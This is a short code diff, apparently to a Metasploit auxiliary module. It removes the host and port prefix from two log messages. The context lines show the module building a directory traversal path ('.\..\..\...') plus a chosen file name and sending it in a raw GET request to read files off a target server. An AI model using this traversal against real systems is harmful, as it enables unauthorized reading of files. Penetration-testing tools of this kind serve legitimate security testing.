@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
     traversal = '.\\..\\..\\..\\..\\..\\..\\..\\'
     uri = normalize_uri(datastore['URIPATH']) + traversal + datastore['FILE']
 
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Requesting: #{uri}")
+    print_status("Requesting: #{uri}")
 
     res = send_request_raw({
       'method' => 'GET',
@@ -66,7 +66,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res.code == 404
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - File not found")
+      print_error("File not found")
       return
     end
 
